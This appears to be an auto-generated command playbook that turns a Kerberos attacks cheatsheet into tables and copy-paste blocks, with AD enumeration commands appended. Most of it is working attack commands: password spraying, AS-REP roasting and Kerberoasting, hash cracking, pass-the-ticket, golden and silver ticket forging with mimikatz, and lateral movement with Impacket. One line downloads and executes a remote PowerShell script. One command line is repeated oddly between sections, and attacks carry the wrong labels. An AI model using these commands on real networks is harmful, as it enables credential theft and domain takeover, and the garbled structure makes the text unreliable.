---
title: "Trained Command Playbook: kerberos attacks cheatsheet"
category: commands
domain_hub: "[[knowledge/04_windows_powershell_wmi_cim_and_active_directory]]"
os_platform: windows
primary_tactic: Active_Enum
summary: "Verified Windows & Linux command playbook for kerberos attacks cheatsheet (Active_Enum): PowerShell 2.0-7+ cmdlets, Get-CimInstance/Get-WmiObject/wmic queries, WinRM/PSRemoting (Invoke-Command, Enter-PSSession), Active Direc"
when_to_apply: "Apply when working with kerberos attacks cheatsheet (windows): Apply when automating Windows enumeration with PowerShell or WMI/CIM (`Get-CimInstance`/`wmic`), executing commands remotely via WinRM/WMI, enumerating Active Directory users/groups/computers/trusts/GPOs (`dsquery`/`nltest`/`net`), or auditing Kerberos tickets (`klist`) and SPNs (`setspn`)."
tags: [credential_access, enumeration, hashcat, https, impacket, john, kerberos, lateral_movement_routing_pivot, mdp, mimikatz, powershell, sysinternals, text, trained, windows, wmic, get-ciminstance, winrm, invoke-command, dsquery, nltest, klist]
source_file: "kerberos attacks cheatsheet"
updated: 2026-10-30
---

powershell -NoProfile -Command "Get-CimInstance Win32_ComputerSystem | Select-Object Name,Domain,Manufacturer,Model,UserName,TotalPhysicalMemory"
# Trained Command Playbook: `kerberos_attacks_cheatsheet.md`
powershell -NoProfile -Command "Get-CimInstance Win32_ComputerSystem | Select-Object Name,Domain,Manufacturer,Model,UserName,TotalPhysicalMemory"
- **Source Document:** `~/Projects/CORA/Training/kerberos_attacks_cheatsheet.md`
- **CEGAR Verified Commands:** `35` (`0` malformed/unsafe snippets filtered)
- **MDP Tactical Transitions (`Tactic -> Technique -> Tool -> Command`):** `35`
- **Discovered IPs/Subnets:** `None`
- **Discovered Interfaces:** `None`
- **Related Knowledge Note:** [[knowledge/trained_kerberos_attacks_cheatsheet]]
powershell -NoProfile -Command "Get-CimInstance Win32_ComputerSystem | Select-Object Name,Domain,Manufacturer,Model,UserName,TotalPhysicalMemory"
## Distilled MDP Tactical Transitions (`Tactic -> Technique -> Tool -> Command`)
| Pre-State ($s$) | Tactic ($\tau$) | Technique ($k$) | Tool ($u$) | Post-State ($s'$) | Verified Command ($c$) |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `python` | `s_credentials_or_certs_acquired` | `python kerbrute.py -domain <domain_name> -users <users_file> -passwords <passwords_file> -outputfile <output_file>` |
| `s_firewall_or_acl_unlocked` | **`Lateral_Movement_Routing_Pivot`** | Remote Host Execution, L2/L3 Route Injection & Subnet Pivot | `python` | `s_cross_subnet_pivot_routed` | `python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `python` | `s_active_services_enumerated` | `python ticket_converter.py ticket.kirbi ticket.ccache` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `python` | `s_credentials_or_certs_acquired` | `python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat \| john]> -outputfile <output_AS_REP_responses_file>` |
| `s_firewall_or_acl_unlocked` | **`Lateral_Movement_Routing_Pivot`** | Remote Host Execution, L2/L3 Route Injection & Subnet Pivot | `python` | `s_cross_subnet_pivot_routed` | `python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `python` | `s_active_services_enumerated` | `python ticket_converter.py ticket.ccache ticket.kirbi` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `python` | `s_credentials_or_certs_acquired` | `python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat \| john]> -outputfile <output_AS_REP_responses_file>` |
| `s_firewall_or_acl_unlocked` | **`Lateral_Movement_Routing_Pivot`** | Remote Host Execution, L2/L3 Route Injection & Subnet Pivot | `python` | `s_cross_subnet_pivot_routed` | `python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `hashcat` | `s_credentials_or_certs_acquired` | `hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `john` | `s_credentials_or_certs_acquired` | `john --wordlist=<passwords_file> <AS_REP_responses_file>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `python` | `s_credentials_or_certs_acquired` | `python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `iex` | `s_credentials_or_certs_acquired` | `iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `invoke-kerberoast` | `s_credentials_or_certs_acquired` | `Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat \| john]> \| % { $_.Hash } \| Out-File -Encoding ASCII <output_TGSs_file>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `hashcat` | `s_credentials_or_certs_acquired` | `hashcat -m 13100 --force <TGSs_file> <passwords_file>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `john` | `s_credentials_or_certs_acquired` | `john --format=krb5tgs --wordlist=<passwords_file> <AS_REP_responses_file>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `python` | `s_credentials_or_certs_acquired` | `python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `python` | `s_credentials_or_certs_acquired` | `python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `python` | `s_credentials_or_certs_acquired` | `python getTGT.py <domain_name>/<user_name>:[password]` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `export` | `s_credentials_or_certs_acquired` | `export KRB5CCNAME=<TGT_ccache_file>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `grep` | `s_credentials_or_certs_acquired` | `grep default_ccache_name /etc/krb5.conf` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `mimikatz` | `s_credentials_or_certs_acquired` | `mimikatz # sekurlsa::tickets /export` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `export` | `s_credentials_or_certs_acquired` | `export KRB5CCNAME=<TGT_ccache_file_path>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `mimikatz` | `s_credentials_or_certs_acquired` | `mimikatz # kerberos::ptt <ticket_kirbi_file>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `python` | `s_credentials_or_certs_acquired` | `python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `python` | `s_credentials_or_certs_acquired` | `python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `export` | `s_credentials_or_certs_acquired` | `export KRB5CCNAME=<TGS_ccache_file>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `mimikatz` | `s_credentials_or_certs_acquired` | `mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<ntlm_hash> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `mimikatz` | `s_credentials_or_certs_acquired` | `mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `mimikatz` | `s_credentials_or_certs_acquired` | `mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `python` | `s_credentials_or_certs_acquired` | `python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `python` | `s_credentials_or_certs_acquired` | `python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `mimikatz` | `s_credentials_or_certs_acquired` | `mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `mimikatz` | `s_credentials_or_certs_acquired` | `mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `mimikatz` | `s_credentials_or_certs_acquired` | `mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `python` | `s_credentials_or_certs_acquired` | `python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'` |
powershell -NoProfile -Command "Get-CimInstance Win32_ComputerSystem | Select-Object Name,Domain,Manufacturer,Model,UserName,TotalPhysicalMemory"
## Verified Executable Commands (Grouped by Capability Layer)
powershell -NoProfile -Command "Get-CimInstance Win32_ComputerSystem | Select-Object Name,Domain,Manufacturer,Model,UserName,TotalPhysicalMemory"
### General_System (34 commands)
```bash
python kerbrute.py -domain <domain_name> -users <users_file> -passwords <passwords_file> -outputfile <output_file>
python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>
john --wordlist=<passwords_file> <AS_REP_responses_file>
python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>
Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>
hashcat -m 13100 --force <TGSs_file> <passwords_file>
john --format=krb5tgs --wordlist=<passwords_file> <AS_REP_responses_file>
python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
python getTGT.py <domain_name>/<user_name>:[password]
export KRB5CCNAME=<TGT_ccache_file>
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
grep default_ccache_name /etc/krb5.conf
mimikatz # sekurlsa::tickets /export
python ticket_converter.py ticket.kirbi ticket.ccache
python ticket_converter.py ticket.ccache ticket.kirbi
export KRB5CCNAME=<TGT_ccache_file_path>
mimikatz # kerberos::ptt <ticket_kirbi_file>
python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
export KRB5CCNAME=<TGS_ccache_file>
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<ntlm_hash> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name>
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name>
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name>
python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
```
powershell -NoProfile -Command "Get-CimInstance Win32_ComputerSystem | Select-Object Name,Domain,Manufacturer,Model,UserName,TotalPhysicalMemory"
### L7_HTTP_Web (1 commands)
```bash
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
```
powershell -NoProfile -Command "Get-CimInstance Win32_ComputerSystem | Select-Object Name,Domain,Manufacturer,Model,UserName,TotalPhysicalMemory"

<!-- CORA-MAXIMIZED-COMMANDS-START -->
## Maximized Windows & Linux Command Examples for `kerberos attacks cheatsheet`

> **Domain Hub:** [[knowledge/04_windows_powershell_wmi_cim_and_active_directory|Domain Hub 04: Windows PowerShell, WMI/CIM, WinRM Remoting, Active Directory (dsquery), Kerberos & Post-Exploitation]]  
> **Master Playbooks:** [[commands/windows_master_command_playbook]] | [[commands/linux_master_command_playbook]] | [[commands/curl_playbook]] | [[commands/tio_serial_playbook]]  
> **When to Apply:** Apply when automating Windows enumeration with PowerShell or WMI/CIM (`Get-CimInstance`/`wmic`), executing commands remotely via WinRM/WMI, enumerating Active Directory users/groups/computers/trusts/GPOs (`dsquery`/`nltest`/`net`), or auditing Kerberos tickets (`klist`) and SPNs (`setspn`).  
> **15-Engine H-MDP State Transition:** `s_active_services_enumerated` $\xrightarrow{\text{Active_Enum}}$ `s_credentials_or_certs_acquired` | **Bayesian Root-Cause Triggers:** `ad_domain_trust_or_spn_exposure, winrm_or_wmi_lateral_movement_path, kerberos_ticket_or_delegation_weakness, unquoted_service_or_gpo_misconfig` | **Isolation:** `RED, BLUE (Active Directory / WinRM network queries require allowed LAN interface; local CIM/WMI works in WHITE)`

| Primary Command (`Windows` / `Linux`) | OS / Shell | What It Does & Key Flags | When to Apply & Expected Output | Cross-Platform Equivalent |
| :--- | :--- | :--- | :--- | :--- |
| `powershell -NoProfile -Command "Get-CimInstance Win32_ComputerSystem \| Select-Object Name,Domain,Manufacturer,Model,UserName,TotalPhysicalMemory"` | **PowerShell** | Queries `Win32_ComputerSystem` via modern CIM (WS-Man/DCOM) for host domain membership, logged-on console user, and hardware model. | Apply in PowerShell 4.0+ as the fast, structured replacement for `wmic computersystem` (`[[knowledge/trained_ps_get-cim]]`). | `hostnamectl && lscpu && free -h` |
| `powershell -NoProfile -Command "Get-CimInstance Win32_Service \| Where-Object {$_.State -eq 'Running' -and $_.PathName -notmatch 'C:\\Windows'} \| Select-Object Name,DisplayName,StartName,PathName"` | **PowerShell** | Finds all running third-party/custom Windows services whose binary path is outside `C:\Windows`. | Apply to quickly isolate non-OS services and inspect their execution account (`StartName`) and binary path. | `systemctl list-units --type=service --state=running` |
| `powershell -NoProfile -Command "Get-CimInstance -Namespace root\subscription -ClassName __EventFilter; Get-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer; Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding"` | **PowerShell** | Audits the `root\subscription` WMI repository for permanent WMI Event Filters, Consumers, and Bindings. | Apply to detect fileless WMI persistence (`[[knowledge/trained_us-15-graeber-abusing-windows-management-instrumentation-wmi-to-]]`). | `crontab -l && systemctl list-timers --all` |
| `wmic /node:"<TARGET_IP>" process call create "cmd.exe /c ipconfig /all > C:\Temp\out.txt"` | **Windows CMD** | Executes a command remotely on `<TARGET_IP>` over DCOM/RPC (`TCP 135` + dynamic high ports) using WMI `Win32_Process.Create`. | Apply for agentless remote execution across domain hosts when WinRM (`5985`) is closed but RPC (`135`) is open. | `ssh <USER>@<TARGET_IP> 'ip -4 -br addr'` |
| `winrm enumerate winrm/config/listener && powershell -NoProfile -Command "Test-WSMan -ComputerName <TARGET_IP>"` | **CMD / PS** | Enumerates local WinRM listeners (`5985` HTTP / `5986` HTTPS) and tests WS-Management reachability on `<TARGET_IP>`. | Apply before running `Invoke-Command` or `Enter-PSSession` (`[[commands/trained_powershell-remoting]]`). | `nc -zv <TARGET_IP> 22` |
| `powershell -NoProfile -Command "Invoke-Command -ComputerName <TARGET_IP> -ScriptBlock { hostname; whoami /all; Get-NetIPConfiguration }"` | **PowerShell** | Executes a PowerShell script block on remote host `<TARGET_IP>` over WinRM (`TCP 5985`/`5986`) and returns serialized objects. | Apply for multi-host administrative command execution and remote triage. | `ssh <USER>@<TARGET_IP> 'hostname; id; ip addr'` |
| `nltest /dclist: && nltest /domain_trusts /all_trusts` | **Windows CMD** | Discovers all Domain Controllers in the current domain and enumerates all forest/external/transitive domain trusts. | Apply first during Active Directory reconnaissance (`[[commands/trained_domain_service_tools]]`). | `dig _ldap._tcp.dc._msdcs.<DOMAIN> SRV` |
| `net user /domain && net group "Domain Admins" /domain && net group "Enterprise Admins" /domain` | **Windows CMD** | Queries the Domain Controller for all domain user accounts and members of high-privilege administrative groups. | Apply on any domain-joined workstation/server to map privileged accounts (`[[commands/trained_net_cmds_1]]`). | `ldapsearch -x -H ldap://<DC_IP> -b 'dc=domain,dc=local'` |
| `dsquery user -limit 0 \| dsget user -samid -sid -upn -pwdneverexpires -disabled && dsquery computer -limit 0` | **Windows CMD (AD)** | Queries Active Directory LDAP for all user accounts (with SAMID, SID, and password expiry flags) and all domain computers (`[[commands/trained_ds_cmds]]`). | Apply when RSAT or DC tools are present to export complete Active Directory object inventories. | `ldapsearch -LLL -H ldap://<DC_IP> '(objectClass=user)' sAMAccountName objectSid` |
| `setspn -Q */* && klist` | **Windows CMD** | Lists all Service Principal Names (`SPNs`) registered in Active Directory (`setspn -Q */*`) and inspects cached Kerberos tickets (`klist`). | Apply to locate SQL/HTTP/Exchange service accounts (`Kerberoasting` audit) and verify active TGT/TGS encryption types (`[[knowledge/trained_kerberos_attacks_cheatsheet]]`). | `klist && kvno <SPN>` |

### Copy-Pasteable Execution Block (Windows & Linux)
```bash
# [PowerShell] Queries `Win32_ComputerSystem` via modern CIM (WS-Man/DCOM) for host domain membership, logged-on console user, and hardware model.
powershell -NoProfile -Command "Get-CimInstance Win32_ComputerSystem | Select-Object Name,Domain,Manufacturer,Model,UserName,TotalPhysicalMemory"
# [PowerShell] Finds all running third-party/custom Windows services whose binary path is outside `C:\Windows`.
powershell -NoProfile -Command "Get-CimInstance Win32_Service | Where-Object {$_.State -eq 'Running' -and $_.PathName -notmatch 'C:\\Windows'} | Select-Object Name,DisplayName,StartName,PathName"
# [PowerShell] Audits the `root\subscription` WMI repository for permanent WMI Event Filters, Consumers, and Bindings.
powershell -NoProfile -Command "Get-CimInstance -Namespace root\subscription -ClassName __EventFilter; Get-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer; Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding"
# [Windows CMD] Executes a command remotely on `<TARGET_IP>` over DCOM/RPC (`TCP 135` + dynamic high ports) using WMI `Win32_Process.Create`.
wmic /node:"<TARGET_IP>" process call create "cmd.exe /c ipconfig /all > C:\Temp\out.txt"
# [CMD / PS] Enumerates local WinRM listeners (`5985` HTTP / `5986` HTTPS) and tests WS-Management reachability on `<TARGET_IP>`.
winrm enumerate winrm/config/listener && powershell -NoProfile -Command "Test-WSMan -ComputerName <TARGET_IP>"
# [PowerShell] Executes a PowerShell script block on remote host `<TARGET_IP>` over WinRM (`TCP 5985`/`5986`) and returns serialized objects.
powershell -NoProfile -Command "Invoke-Command -ComputerName <TARGET_IP> -ScriptBlock { hostname; whoami /all; Get-NetIPConfiguration }"
```
<!-- CORA-MAXIMIZED-COMMANDS-END -->
